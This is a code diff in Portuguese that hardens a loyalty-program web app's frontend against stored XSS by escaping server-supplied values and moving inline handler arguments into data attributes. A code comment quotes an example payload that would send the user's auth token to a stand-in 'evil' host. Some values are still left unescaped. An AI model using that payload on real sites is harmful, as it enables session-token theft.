@@ -24,6 +24,20 @@ if (WHITELABEL_SLUG && window.PRELOAD_EMPRESA) {
 const $ = (sel) => document.querySelector(sel);
 const screenContainer = $('#screen-container');
 
+/**
+ * Escapa string para uso seguro em interpolação dentro de innerHTML.
+ * Use SEMPRE que renderizar dado vindo do servidor (nome, descrição, código).
+ * Sem isso, um valor como `<img src=x onerror=fetch('//evil/'+localStorage.fp_token)>`
+ * vira XSS armazenado e rouba o token Sanctum do cliente.
+ */
+function esc(s) {
+    if (s === null || s === undefined) return '';
+    return String(s).replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+    })[c]);
+}
+function escAttr(s) { return esc(s); }
+
 function toast(msg, tipo = 'info') {
     const t = $('#toast');
     t.textContent = msg;
@@ -248,14 +262,14 @@ async function telaEscolherEmpresa() {
     document.documentElement.style.setProperty('--cor-secundaria', s.cor_secundaria);
 
     const cardEmpresa = (e) => `
-        <button onclick='selecionarEmpresa(${JSON.stringify(e)})'
+        <button onclick='selecionarEmpresa(${JSON.stringify(e).replace(/</g, "\\u003c")})'
                 class="empresa-card w-full flex items-center gap-3 p-4 bg-white border border-slate-200 rounded-2xl text-left transition-all hover:shadow-lg hover:-translate-y-0.5 hover:border-transparent active:scale-[0.98]">
             ${e.logo
-                ? `<img src="${e.logo}" class="w-14 h-14 rounded-2xl object-contain bg-slate-50 flex-shrink-0 ring-1 ring-slate-100">`
-                : `<div class="w-14 h-14 rounded-2xl flex items-center justify-center text-white font-bold text-2xl flex-shrink-0 shadow-sm" style="background:linear-gradient(135deg,${e.cor_primaria || '#6366f1'},${e.cor_secundaria || '#8b5cf6'})">${e.nome.charAt(0)}</div>`
+                ? `<img src="${escAttr(e.logo)}" class="w-14 h-14 rounded-2xl object-contain bg-slate-50 flex-shrink-0 ring-1 ring-slate-100">`
+                : `<div class="w-14 h-14 rounded-2xl flex items-center justify-center text-white font-bold text-2xl flex-shrink-0 shadow-sm" style="background:linear-gradient(135deg,${escAttr(e.cor_primaria || '#6366f1')},${escAttr(e.cor_secundaria || '#8b5cf6')})">${esc(String(e.nome || '').charAt(0))}</div>`
             }
             <div class="flex-1 min-w-0">
-                <p class="font-semibold text-slate-800 truncate">${e.nome}</p>
+                <p class="font-semibold text-slate-800 truncate">${esc(e.nome)}</p>
                 <p class="text-xs text-slate-500 mt-0.5"><i class="ri-arrow-right-circle-line"></i> Toque para acessar</p>
             </div>
             <div class="w-9 h-9 rounded-full bg-slate-100 flex items-center justify-center text-slate-400 flex-shrink-0">
@@ -270,11 +284,11 @@ async function telaEscolherEmpresa() {
             <div class="absolute inset-0 opacity-20" style="background-image: radial-gradient(circle at 20% 20%, white 1px, transparent 1px), radial-gradient(circle at 80% 60%, white 1px, transparent 1px); background-size: 40px 40px;"></div>
             <div class="relative px-6 pt-10 pb-16 text-center">
                 ${s.logo
-                    ? `<img src="${s.logo}" alt="${s.nome}" class="w-20 h-20 mx-auto rounded-2xl bg-white/15 backdrop-blur p-2 mb-4 object-contain shadow-lg ring-1 ring-white/20">`
-                    : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/15 backdrop-blur flex items-center justify-center text-4xl font-bold mb-4 shadow-lg ring-1 ring-white/20">${inicial}</div>`
+                    ? `<img src="${escAttr(s.logo)}" alt="${escAttr(s.nome)}" class="w-20 h-20 mx-auto rounded-2xl bg-white/15 backdrop-blur p-2 mb-4 object-contain shadow-lg ring-1 ring-white/20">`
+                    : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/15 backdrop-blur flex items-center justify-center text-4xl font-bold mb-4 shadow-lg ring-1 ring-white/20">${esc(inicial)}</div>`
                 }
-                <h1 class="text-3xl font-bold tracking-tight">${s.nome}</h1>
-                <p class="text-white/85 text-sm mt-1.5">${s.slogan || 'Programa de fidelidade'}</p>
+                <h1 class="text-3xl font-bold tracking-tight">${esc(s.nome)}</h1>
+                <p class="text-white/85 text-sm mt-1.5">${esc(s.slogan || 'Programa de fidelidade')}</p>
             </div>
         </div>
 
@@ -311,7 +325,7 @@ async function telaEscolherEmpresa() {
         </div>
 
         <p class="text-center text-[11px] text-slate-400 pb-6 px-4">
-            Powered by <span class="font-semibold text-slate-500">${s.nome}</span>
+            Powered by <span class="font-semibold text-slate-500">${esc(s.nome)}</span>
         </p>
     </div>`;
 
@@ -353,10 +367,10 @@ async function telaLogin() {
         <div class="p-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
             ${semWhitelabel ? `<button onclick="showScreen('escolherEmpresa')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition"><i class="ri-arrow-left-line"></i> Trocar empresa</button>` : ''}
             ${e?.logo
-                ? `<img src="${e.logo}" alt="${e.nome}" class="w-16 h-16 rounded-2xl bg-white/20 backdrop-blur p-2 mb-3 object-contain">`
-                : `<div class="w-16 h-16 rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl font-bold mb-3">${(e?.nome || 'F')[0]}</div>`
+                ? `<img src="${escAttr(e.logo)}" alt="${escAttr(e.nome)}" class="w-16 h-16 rounded-2xl bg-white/20 backdrop-blur p-2 mb-3 object-contain">`
+                : `<div class="w-16 h-16 rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl font-bold mb-3">${esc((e?.nome || 'F')[0])}</div>`
             }
-            <h1 class="text-2xl font-bold">${e?.nome || 'FidelizaPro'}</h1>
+            <h1 class="text-2xl font-bold">${esc(e?.nome || 'FidelizaPro')}</h1>
             <p class="text-white/80 text-sm">Acesse seu programa de fidelidade</p>
         </div>
         <form id="form-login" class="p-6 -mt-4 bg-white rounded-t-3xl space-y-4 flex-1">
@@ -897,12 +911,12 @@ async function telaHome() {
             <div class="flex items-center justify-between">
                 <div>
                     <p class="text-white/70 text-xs uppercase tracking-wider">Olá,</p>
-                    <h1 class="text-2xl font-bold mt-0.5">${c.nome.split(' ')[0]} 👋</h1>
+                    <h1 class="text-2xl font-bold mt-0.5">${esc(String(c.nome || '').split(' ')[0])} 👋</h1>
                 </div>
                 <button onclick="showScreen('perfil')" class="w-11 h-11 rounded-full bg-white/20 backdrop-blur flex items-center justify-center font-bold text-lg hover:bg-white/30 transition overflow-hidden">
                     ${c.foto
-                        ? `<img src="${c.foto}" class="w-full h-full object-cover" alt="">`
-                        : c.nome.charAt(0).toUpperCase()}
+                        ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover" alt="">`
+                        : esc(String(c.nome || '').charAt(0).toUpperCase())}
                 </button>
             </div>
 
@@ -1139,8 +1153,8 @@ async function telaCompras() {
                         <i class="ri-shopping-bag-line text-emerald-600"></i>
                     </div>
                     <div class="flex-1 min-w-0">
-                        <p class="font-semibold text-slate-800 truncate">${c.descricao || 'Compra'}</p>
-                        <p class="text-xs text-slate-500 mt-0.5">${c.data_formatada}</p>
+                        <p class="font-semibold text-slate-800 truncate">${esc(c.descricao || 'Compra')}</p>
+                        <p class="text-xs text-slate-500 mt-0.5">${esc(c.data_formatada)}</p>
                         <div class="flex flex-wrap gap-x-3 gap-y-1 mt-2">
                             <span class="text-xs text-amber-700 bg-amber-50 px-2 py-0.5 rounded-full">
                                 <i class="ri-coin-line"></i> +${fmtNum(c.pontos_gerados)} pts
@@ -1205,11 +1219,12 @@ async function telaCatalogo() {
                             ` : ''}
                         </div>
                         <div class="p-3">
-                            <p class="font-semibold text-sm text-slate-800 line-clamp-2 min-h-[2.5em]">${r.nome}</p>
-                            <p class="font-bold text-sm mt-2 flex items-center gap-1" style="color:${cor}">
+                            <p class="font-semibold text-sm text-slate-800 line-clamp-2 min-h-[2.5em]">${esc(r.nome)}</p>
+                            <p class="font-bold text-sm mt-2 flex items-center gap-1" style="color:${escAttr(cor)}">
                                 <i class="ri-coin-line"></i> ${fmtNum(r.custo_pontos)} pts
                             </p>
-                            <button onclick="solicitarResgate(${r.id}, '${r.nome.replace(/'/g, "\\'")}', ${r.custo_pontos})"
+                            <button data-resgate-id="${Number(r.id)}" data-resgate-nome="${escAttr(r.nome)}" data-resgate-custo="${Number(r.custo_pontos)}"
+                                    onclick="solicitarResgate(this.dataset.resgateId, this.dataset.resgateNome, this.dataset.resgateCusto)"
                                     ${!r.pode_resgatar ? 'disabled' : ''}
                                     class="mt-3 w-full text-xs font-semibold py-2 text-white rounded-lg disabled:bg-slate-200 disabled:text-slate-400 transition"
                                     style="${r.pode_resgatar ? `background:linear-gradient(135deg,${cor},${corSec})` : ''}">
@@ -1283,12 +1298,12 @@ async function telaPerfil() {
         <div class="px-5 pt-8 pb-12 text-white text-center" style="background:linear-gradient(135deg,${e.cor_primaria},${e.cor_secundaria})">
             <div class="w-24 h-24 mx-auto rounded-full bg-white/20 backdrop-blur border-4 border-white/30 flex items-center justify-center text-4xl font-bold shadow-lg overflow-hidden">
                 ${c.foto
-                    ? `<img src="${c.foto}" class="w-full h-full object-cover" alt="">`
-                    : c.nome.charAt(0).toUpperCase()}
+                    ? `<img src="${escAttr(c.foto)}" class="w-full h-full object-cover" alt="">`
+                    : esc(String(c.nome || '').charAt(0).toUpperCase())}
             </div>
-            <h1 class="text-2xl font-bold mt-4">${c.nome}</h1>
-            <p class="text-white/80 text-sm">${c.telefone}</p>
-            ${c.email ? `<p class="text-white/70 text-xs mt-1">${c.email}</p>` : ''}
+            <h1 class="text-2xl font-bold mt-4">${esc(c.nome)}</h1>
+            <p class="text-white/80 text-sm">${esc(c.telefone)}</p>
+            ${c.email ? `<p class="text-white/70 text-xs mt-1">${esc(c.email)}</p>` : ''}
         </div>
 
         <div class="px-4 -mt-8">
@@ -1641,11 +1656,11 @@ async function telaEmpresa() {
             </button>
             <div class="text-center">
                 ${e.logo
-                    ? `<img src="${e.logo}" alt="${e.nome}" class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur p-2 mb-3 object-contain">`
-                    : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl font-bold mb-3">${e.nome.charAt(0)}</div>`
+                    ? `<img src="${escAttr(e.logo)}" alt="${escAttr(e.nome)}" class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur p-2 mb-3 object-contain">`
+                    : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl font-bold mb-3">${esc(String(e.nome || '').charAt(0))}</div>`
                 }
-                <h1 class="text-2xl font-bold">${e.nome}</h1>
-                <p class="text-white/80 text-xs mt-1">Cliente desde ${e.cliente_desde || '—'}</p>
+                <h1 class="text-2xl font-bold">${esc(e.nome)}</h1>
+                <p class="text-white/80 text-xs mt-1">Cliente desde ${esc(e.cliente_desde || '—')}</p>
             </div>
         </div>
 
@@ -1679,19 +1694,19 @@ async function telaEmpresa() {
                 <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-3">Contato</h3>
                 <div class="space-y-3 text-sm">
                     ${e.telefone ? `
-                        <a href="tel:${e.telefone.replace(/\\D/g, '')}" class="flex items-center gap-3 hover:bg-slate-50 -mx-2 px-2 py-1 rounded-lg">
+                        <a href="tel:${escAttr(String(e.telefone).replace(/\D/g, ''))}" class="flex items-center gap-3 hover:bg-slate-50 -mx-2 px-2 py-1 rounded-lg">
                             <i class="ri-phone-line text-slate-400"></i>
-                            <span class="text-slate-700">${e.telefone}</span>
+                            <span class="text-slate-700">${esc(e.telefone)}</span>
                         </a>` : ''}
                     ${e.email ? `
-                        <a href="mailto:${e.email}" class="flex items-center gap-3 hover:bg-slate-50 -mx-2 px-2 py-1 rounded-lg">
+                        <a href="mailto:${escAttr(e.email)}" class="flex items-center gap-3 hover:bg-slate-50 -mx-2 px-2 py-1 rounded-lg">
                             <i class="ri-mail-line text-slate-400"></i>
-                            <span class="text-slate-700 truncate">${e.email}</span>
+                            <span class="text-slate-700 truncate">${esc(e.email)}</span>
                         </a>` : ''}
                     ${e.endereco ? `
                         <div class="flex items-start gap-3">
                             <i class="ri-map-pin-line text-slate-400 mt-0.5"></i>
-                            <span class="text-slate-700">${e.endereco}</span>
+                            <span class="text-slate-700">${esc(e.endereco)}</span>
                         </div>` : ''}
                 </div>
             </div>` : ''}
@@ -1701,13 +1716,13 @@ async function telaEmpresa() {
                 <h3 class="text-xs text-slate-500 uppercase tracking-wider font-semibold mb-2 px-1">Minhas outras empresas (${data.vinculadas.length})</h3>
                 <div class="bg-white rounded-2xl border border-slate-200 overflow-hidden divide-y divide-slate-100">
                     ${data.vinculadas.map(v => `
-                        <a href="${v.url}" class="block p-4 flex items-center gap-3 hover:bg-slate-50 transition">
+                        <a href="${escAttr(v.url)}" class="block p-4 flex items-center gap-3 hover:bg-slate-50 transition">
                             ${v.logo
-                                ? `<img src="${v.logo}" alt="${v.nome}" class="w-11 h-11 rounded-xl object-contain bg-slate-50">`
-                                : `<div class="w-11 h-11 rounded-xl flex items-center justify-center text-white font-semibold" style="background:linear-gradient(135deg,${v.cor_primaria},${v.cor_secundaria})">${v.nome.charAt(0)}</div>`
+                                ? `<img src="${escAttr(v.logo)}" alt="${escAttr(v.nome)}" class="w-11 h-11 rounded-xl object-contain bg-slate-50">`
+                                : `<div class="w-11 h-11 rounded-xl flex items-center justify-center text-white font-semibold" style="background:linear-gradient(135deg,${escAttr(v.cor_primaria)},${escAttr(v.cor_secundaria)})">${esc(String(v.nome || '').charAt(0))}</div>`
                             }
                             <div class="flex-1 min-w-0">
-                                <p class="font-semibold text-slate-800 truncate">${v.nome}</p>
+                                <p class="font-semibold text-slate-800 truncate">${esc(v.nome)}</p>
                                 <div class="flex gap-3 text-xs text-slate-500 mt-0.5">
                                     <span><i class="ri-coin-line"></i> ${fmtNum(v.pontos)}</span>
                                     <span class="text-emerald-600"><i class="ri-money-dollar-circle-line"></i> ${fmtBRL(v.cashback)}</span>
@@ -1768,7 +1783,7 @@ async function telaExtrato() {
                 <p class="font-medium text-slate-800 text-sm">${m.descricao || (credito ? 'Crédito' : 'Débito')}</p>
                 <div class="flex flex-wrap gap-x-2 text-[11px] text-slate-500 mt-0.5">
                     <span>${m.data}</span>
-                    <span class="px-1.5 rounded bg-slate-100 text-slate-600">${m.origem}</span>
+                    <span class="px-1.5 rounded bg-slate-100 text-slate-600">${esc(m.origem)}</span>
                 </div>
                 <p class="text-[11px] text-slate-400 mt-0.5">Saldo após: ${saldoFmt}${pendente ? ` &middot; <span class="text-amber-600">libera em ${m.liberado_em}</span>` : ''}</p>
             </div>
@@ -1940,10 +1955,10 @@ async function telaIndicacoes() {
                 <p class="text-[11px] text-slate-500 uppercase tracking-wider">Seu código de indicação</p>
                 <p class="text-3xl font-bold font-mono my-2 tracking-widest" style="color:${cor}">${data.codigo_indicacao}</p>
                 <div class="flex gap-2 mt-3">
-                    <button onclick="copiarLink('${data.link}')" class="flex-1 py-2.5 rounded-xl border-2 font-semibold text-sm flex items-center justify-center gap-1.5 hover:bg-slate-50 transition" style="border-color:${cor}; color:${cor}">
+                    <button data-link="${escAttr(data.link)}" onclick="copiarLink(this.dataset.link)" class="flex-1 py-2.5 rounded-xl border-2 font-semibold text-sm flex items-center justify-center gap-1.5 hover:bg-slate-50 transition" style="border-color:${escAttr(cor)}; color:${escAttr(cor)}">
                         <i class="ri-link"></i> Copiar link
                     </button>
-                    <button onclick="compartilharIndicacao('${data.link}', '${e.nome.replace(/'/g, "\\'")}')" class="flex-1 py-2.5 rounded-xl text-white font-semibold text-sm flex items-center justify-center gap-1.5 hover:shadow-lg transition" style="background:linear-gradient(135deg,${cor},${corSec})">
+                    <button data-link="${escAttr(data.link)}" data-empresa="${escAttr(e.nome)}" onclick="compartilharIndicacao(this.dataset.link, this.dataset.empresa)" class="flex-1 py-2.5 rounded-xl text-white font-semibold text-sm flex items-center justify-center gap-1.5 hover:shadow-lg transition" style="background:linear-gradient(135deg,${escAttr(cor)},${escAttr(corSec)})">
                         <i class="ri-share-forward-line"></i> Compartilhar
                     </button>
                 </div>
@@ -2007,11 +2022,11 @@ async function telaIndicacoes() {
                 ${data.indicacoes.map(i => `
                     <div class="p-4 flex items-center gap-3">
                         <div class="w-10 h-10 rounded-full bg-slate-100 flex items-center justify-center font-semibold text-slate-600 flex-shrink-0">
-                            ${i.nome_indicado.charAt(0).toUpperCase()}
+                            ${esc(String(i.nome_indicado || '').charAt(0).toUpperCase())}
                         </div>
                         <div class="flex-1 min-w-0">
-                            <p class="font-semibold text-slate-800 truncate">${i.nome_indicado}</p>
-                            <p class="text-xs text-slate-500">${i.telefone} &middot; ${i.data}</p>
+                            <p class="font-semibold text-slate-800 truncate">${esc(i.nome_indicado)}</p>
+                            <p class="text-xs text-slate-500">${esc(i.telefone)} &middot; ${esc(i.data)}</p>
                         </div>
                         <span class="text-[10px] font-semibold px-2 py-1 rounded-full ${
                             i.status === 'convertido' ? 'bg-emerald-50 text-emerald-700' :
@@ -2188,12 +2203,12 @@ async function telaParceiros() {
                 <div class="bg-white border border-slate-200 rounded-2xl overflow-hidden">
                     <div class="p-4 flex items-start gap-3 bg-slate-50 border-b border-slate-100">
                         ${p.logo
-                            ? `<img src="${p.logo}" class="w-12 h-12 rounded-xl object-cover flex-shrink-0">`
-                            : `<div class="w-12 h-12 rounded-xl flex items-center justify-center text-white text-xl flex-shrink-0" style="background:linear-gradient(135deg,${cor},${corSec})"><i class="ri-store-2-line"></i></div>`}
+                            ? `<img src="${escAttr(p.logo)}" class="w-12 h-12 rounded-xl object-cover flex-shrink-0">`
+                            : `<div class="w-12 h-12 rounded-xl flex items-center justify-center text-white text-xl flex-shrink-0" style="background:linear-gradient(135deg,${escAttr(cor)},${escAttr(corSec)})"><i class="ri-store-2-line"></i></div>`}
                         <div class="flex-1 min-w-0">
-                            <p class="font-semibold text-slate-800 truncate">${p.nome}</p>
-                            ${p.categoria ? `<p class="text-xs text-slate-500">${p.categoria}</p>` : ''}
-                            ${p.endereco ? `<p class="text-xs text-slate-500 mt-0.5 flex items-start gap-1"><i class="ri-map-pin-line mt-0.5 flex-shrink-0"></i> <span class="truncate">${p.endereco}</span></p>` : ''}
+                            <p class="font-semibold text-slate-800 truncate">${esc(p.nome)}</p>
+                            ${p.categoria ? `<p class="text-xs text-slate-500">${esc(p.categoria)}</p>` : ''}
+                            ${p.endereco ? `<p class="text-xs text-slate-500 mt-0.5 flex items-start gap-1"><i class="ri-map-pin-line mt-0.5 flex-shrink-0"></i> <span class="truncate">${esc(p.endereco)}</span></p>` : ''}
                         </div>
                     </div>
                     <div class="p-4 space-y-2.5">
@@ -2202,15 +2217,15 @@ async function telaParceiros() {
                                 <div class="flex justify-between items-start gap-3">
                                     <div class="flex-1 min-w-0">
                                         <div class="flex items-center gap-2 flex-wrap">
-                                            <p class="font-semibold text-sm text-slate-800">${b.nome}</p>
+                                            <p class="font-semibold text-sm text-slate-800">${esc(b.nome)}</p>
                                             ${b.destaque ? '<span class="text-[10px] font-semibold bg-amber-100 text-amber-700 px-2 py-0.5 rounded-full"><i class="ri-star-fill"></i> Destaque</span>' : ''}
                                         </div>
                                         <p class="text-emerald-700 font-bold text-xs mt-1 flex items-center gap-1">
-                                            <i class="ri-percent-line"></i> ${b.tipo_descricao}
+                                            <i class="ri-percent-line"></i> ${esc(b.tipo_descricao)}
                                         </p>
-                                        ${b.descricao ? `<p class="text-xs text-slate-600 mt-1.5">${b.descricao}</p>` : ''}
-                                        ${b.condicoes ? `<p class="text-[11px] text-slate-500 mt-1.5 flex items-start gap-1"><i class="ri-information-line mt-0.5 flex-shrink-0"></i> <span>${b.condicoes}</span></p>` : ''}
-                                        ${b.valido_ate ? `<p class="text-[11px] text-slate-500 mt-1"><i class="ri-time-line"></i> Válido até ${b.valido_ate}</p>` : ''}
+                                        ${b.descricao ? `<p class="text-xs text-slate-600 mt-1.5">${esc(b.descricao)}</p>` : ''}
+                                        ${b.condicoes ? `<p class="text-[11px] text-slate-500 mt-1.5 flex items-start gap-1"><i class="ri-information-line mt-0.5 flex-shrink-0"></i> <span>${esc(b.condicoes)}</span></p>` : ''}
+                                        ${b.valido_ate ? `<p class="text-[11px] text-slate-500 mt-1"><i class="ri-time-line"></i> Válido até ${esc(b.valido_ate)}</p>` : ''}
                                     </div>
                                     <button onclick="ativarCupom(${b.id}, '${b.nome.replace(/'/g, "\\'")}')"
                                             ${!b.pode_resgatar ? 'disabled' : ''}
@@ -2727,12 +2742,12 @@ async function telaSorteios() {
                 const corCard = eVencedor ? 'border-amber-300 bg-amber-50' : 'border-slate-200 bg-white';
                 return `
                 <div class="rounded-2xl border-2 ${corCard} overflow-hidden shadow-sm">
-                    ${s.imagem ? `<img src="${s.imagem}" class="w-full h-32 object-cover">` : ''}
+                    ${s.imagem ? `<img src="${escAttr(s.imagem)}" class="w-full h-32 object-cover">` : ''}
                     <div class="p-4">
                         <div class="flex items-start justify-between gap-3">
                             <div class="flex-1 min-w-0">
-                                <p class="font-bold text-slate-800">${s.nome}</p>
-                                ${s.descricao ? `<p class="text-xs text-slate-500 mt-0.5 line-clamp-2">${s.descricao}</p>` : ''}
+                                <p class="font-bold text-slate-800">${esc(s.nome)}</p>
+                                ${s.descricao ? `<p class="text-xs text-slate-500 mt-0.5 line-clamp-2">${esc(s.descricao)}</p>` : ''}
                             </div>
                             <span class="text-[10px] font-semibold px-2 py-0.5 rounded-full flex items-center gap-1 ${info.cls} shrink-0">
                                 <i class="${info.icon}"></i> ${info.label}
@@ -2771,7 +2786,7 @@ async function telaSorteios() {
                         ` : ''}
 
                         ${s.status === 'sorteado' && s.vencedor && !eVencedor ? `
-                            <p class="text-xs text-slate-500 mt-3"><i class="ri-trophy-line"></i> Vencedor: <strong>${s.vencedor}</strong></p>
+                            <p class="text-xs text-slate-500 mt-3"><i class="ri-trophy-line"></i> Vencedor: <strong>${esc(s.vencedor)}</strong></p>
                         ` : ''}
                     </div>
                 </div>
@@ -2818,8 +2833,8 @@ async function telaHistoricoSorteios() {
                     <div class="p-4">
                         <div class="flex items-start justify-between gap-3">
                             <div class="flex-1 min-w-0">
-                                <p class="font-bold text-slate-800">${s.nome}</p>
-                                <p class="text-[11px] text-slate-400 mt-0.5">${s.data_sorteio}</p>
+                                <p class="font-bold text-slate-800">${esc(s.nome)}</p>
+                                <p class="text-[11px] text-slate-400 mt-0.5">${esc(s.data_sorteio)}</p>
                             </div>
                             <span class="text-[10px] font-semibold px-2 py-0.5 rounded-full ${ehCancelado ? 'bg-rose-100 text-rose-700' : 'bg-slate-200 text-slate-600'}">
                                 ${ehCancelado ? 'Cancelado' : 'Encerrado'}
@@ -2839,7 +2854,7 @@ async function telaHistoricoSorteios() {
                             <p class="text-xs text-slate-500 mt-3">
                                 ${eVencedor
                                     ? `<i class="ri-trophy-fill text-amber-500"></i> <strong>Você venceu!</strong>`
-                                    : `<i class="ri-trophy-line"></i> Vencedor: <strong>${s.vencedor}</strong>`}
+                                    : `<i class="ri-trophy-line"></i> Vencedor: <strong>${esc(s.vencedor)}</strong>`}
                             </p>
                         ` : ''}
                     </div>
